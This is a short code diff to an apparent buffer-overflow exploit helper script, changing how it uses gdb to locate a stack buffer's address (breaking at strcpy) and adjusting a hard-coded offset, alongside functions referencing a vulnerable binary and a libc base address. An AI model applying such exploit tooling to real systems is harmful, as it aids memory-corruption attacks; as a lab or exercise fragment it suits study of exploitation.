@@ -131,7 +131,7 @@ def find_null_byte(vuln_bin, libc_base_addr):
 def find_buff_addr(vuln_bin):
 
     with io.FileIO("find_buf.gdb", "w") as file:
-        file.write("b main\nrun hello\np/x &buf[0]\n")
+        file.write("b strcpy\nrun hello\nfinish\np/x &buf[0]\n")
    
     cmd = "gdb --batch --command=./find_buf.gdb --args "
     cmd = cmd + vuln_bin
@@ -139,7 +139,7 @@ def find_buff_addr(vuln_bin):
     
     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
     proc.wait()
-    buf_addr = int(proc.stdout.read(), 16) + 0xb0 - 0x180
+    buf_addr = int(proc.stdout.read(), 16) + 0x10 - 0x180
 
     os.remove("./find_buf.gdb")
     return buf_addr
